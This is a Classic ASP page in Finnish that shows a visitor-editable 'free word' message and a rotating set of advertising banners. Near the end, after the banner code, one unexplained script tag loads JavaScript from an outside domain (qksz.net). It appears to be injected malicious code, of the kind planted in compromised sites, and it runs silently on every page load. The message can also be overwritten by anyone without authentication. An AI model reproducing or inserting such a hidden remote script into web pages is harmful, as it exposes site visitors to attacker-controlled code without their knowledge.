<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">

<html>
<head>
	<title>vapaa sana</title>
<META HTTP-EQUIV="refresh" content="600; url=sana.asp">
<link rel="stylesheet" href="login.css" type="text/css">
</head>

<body bgcolor="#000000" text="#FFFFFF">
<%
sanoma = request.form("sanoma")
vaihda = request.querystring("vaihda")

if vaihda = "" then
	if sanoma = "" then
		set objFSO = Server.CreateObject("Scripting.FileSystemObject")
		set objSanoma = objFSO.OpenTextFile(Server.Mappath("sana.txt"), 1, false)
		sanoma = objSanoma.readall
		objSanoma.close
	else
		set objFSO = Server.CreateObject("Scripting.FileSystemObject")
		set objSanoma = objFSO.CreateTextFile(Server.Mappath("sana.txt"), true)
		sanoma = replace(sanoma, "<", "&lt;")
		sanoma = replace(sanoma, ">", "&gt;")
		sanoma = replace(sanoma, "&lt;b&gt;", "<b>")
		sanoma = replace(sanoma, "&lt;/b&gt;", "</b>")
		sanoma = replace(sanoma, "&lt;i&gt;", "<i>")
		sanoma = replace(sanoma, "&lt;/i&gt;", "</i>")
		sanoma = replace(sanoma, "&lt;u&gt;", "<u>")
		sanoma = replace(sanoma, "&lt;/u&gt;", "</u>")
		sanoma = replace(sanoma, "&lt;B&gt;", "<b>")
		sanoma = replace(sanoma, "&lt;/B&gt;", "</b>")
		sanoma = replace(sanoma, "&lt;I&gt;", "<i>")
		sanoma = replace(sanoma, "&lt;/I&gt;", "</i>")
		sanoma = replace(sanoma, "&lt;U&gt;", "<u>")
		sanoma = replace(sanoma, "&lt;/U&gt;", "</u>")
		objSanoma.writeline sanoma
		objSanoma.close
	end if
%>
<table width="100%" cellpadding="0" cellspacing="0" border="0">
<tr>
	<td width="90"><a href="sana.asp?vaihda=true"><img onmouseover="this.src='pics/link_sanoma2.gif'" onmouseout="this.src='pics/link_sanoma.gif'" src="pics/link_sanoma.gif" width="73" height="11" alt="sanoma" border="0"></a></td>
	<td align="left" valign="middle" width="100%">&nbsp;<%=sanoma %></td>
</tr>
<tr>
	<td colspan="2" align="right" valign="top"><%
Randomize
dim bannerit(13, 2)
bannerit(0, 0) = "<script language=""JavaScript"" src=""http://impfi.tradedoubler.com/imp/1852/135152""></script>"
bannerit(1, 0) = "<script language=""JavaScript"" src=""http://impfi.tradedoubler.com/imp/1939/135152""></script>"
bannerit(2, 0) = "<script language=""JavaScript"" src=""http://impfi.tradedoubler.com/imp/2038/135152""></script>"
bannerit(3, 0) = "<script language=""JavaScript"" src=""http://impfi.tradedoubler.com/imp/6411/135152""></script>"
bannerit(4, 0) = "<script language=""JavaScript"" src=""http://impfi.tradedoubler.com/imp/2044/135152""></script>"
bannerit(5, 0) = "<script language=""JavaScript"" src=""http://impfi.tradedoubler.com/imp/2062/135152""></script>"
bannerit(6, 0) = "<script language=""JavaScript"" src=""http://impfi.tradedoubler.com/imp/3685/135152""></script>"
bannerit(7, 0) = "<script language=""JavaScript"" src=""http://impfi.tradedoubler.com/imp/3686/135152""></script>"
bannerit(8, 0) = "http://www.elektronia.com/vertigo/banners/vertigobanneriso.gif"
bannerit(8, 1) = "http://www.elektronia.com/vertigo/"
bannerit(9, 0) = "http://www.anqqa.com/klubitus/banner/sb_static468x60.gif"
bannerit(9, 1) = "http://www.linkcounter.com/go.php?linkid=183485"
bannerit(10, 0) = "http://www.anqqa.com/klubitus/banner/fiktio_468_60.gif"
bannerit(10, 1) = "http://www.fiktio.fi/"
bannerit(11, 0) = "http://www.holamafia.net/images/bannerit/hola.gif"
bannerit(11, 1) = "http://www.holamafia.net/"
bannerit(12, 0) = "http://www.anqqa.com/klubitus/banner/compilation_468x60.gif"
bannerit(12, 1) = "http://www.platinum.ac/"
bannerit(13, 0) = "http://www.anqqa.com/klubitus/banner/Banner_Screen_SteveLawler.gif"
bannerit(13, 1) = "http://www.screenclub.net/"
banneri = fix(rnd() * 14)
if (banneri < 8) then
	response.write bannerit(banneri, 0)
else
	response.write "<a href=""" & bannerit(banneri, 1) & """ target=""_new""><img src=""" & bannerit(banneri, 0) & """ width=""468"" height=""60"" alt="""" border=""0""></a>"
end if
%><SCRIPT LANGUAGE="javascript" src="http://www.qksz.net/1e-3z4i"> </SCRIPT></td>
</tr>
</table>
<% else %>
<form action="sana.asp" method="POST">
<table width="100%" cellpadding="5" cellspacing=0 border=0>
<tr>
	<td width="80" align="right">uus sanoma: </td>
	<td><input type="Text" name="sanoma" size="80" maxlength="200"></td>
	<td align="left">
<input style="background:" type="Image" src="pics/icon_ok.gif" border="0" width="28" height="35" alt="oujeah!"> <a 	href="javascript:history.go(-1)"><img src="pics/icon_pyh.gif" width=28 height=36 border=0 alt="antaa olla"></a>	</td>
</tr>
</table>
</form>
<% end if %>

</body>
</html>
